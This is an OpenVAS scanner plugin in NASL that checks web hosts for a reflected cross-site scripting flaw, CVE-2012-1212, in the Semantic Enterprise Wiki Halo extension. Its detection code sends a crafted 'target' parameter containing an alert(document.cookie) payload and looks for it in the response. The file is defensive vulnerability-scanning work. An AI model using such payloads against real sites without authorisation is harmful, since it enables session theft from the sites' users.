###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_semantic_ent_wiki_target_param_xss_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# Semantic Enterprise Wiki Halo Extension 'target' XSS Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802709");
  script_version("$Revision: 11374 $");
  script_cve_id("CVE-2012-1212");
  script_bugtraq_id(51980);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-03-16 16:34:28 +0530 (Fri, 16 Mar 2012)");
  script_name("Semantic Enterprise Wiki Halo Extension 'target' XSS Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47968");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51980");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73167");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/109637/SMW-1.5.6-Cross-Site-Scripting.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary
  web script or HTML in a user's browser session in the context of an affected
  site.");
  script_tag(name:"affected", value:"Semantic Enterprise Wiki (SMW+) 1.6.0_2 and earlier");
  script_tag(name:"insight", value:"The flaw is due to an input passed via the 'target' parameter
  to 'index.php/Special:FormEdit' is not properly sanitised in the
  'smwfOnSfSetTargetName()' function before being returned to the user.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running Semantic Enterprise Wiki and is prone to cross-site
  scripting vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/mediawiki", "/smw", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item: string(dir, "/index.php/Main_Page"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  if("SMW" >< rcvRes && "semantic enterprise wiki" >< rcvRes)
  {
    url = dir + "/index.php/Special:FormEdit?target='%3Balert(" +
                "document.cookie)%2F%2F\&categories=Calendar+";

    if(http_vuln_check(port:port, url:url, pattern:";alert(document.cookie" +
                       ")\/\/\\'", check_header:TRUE))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);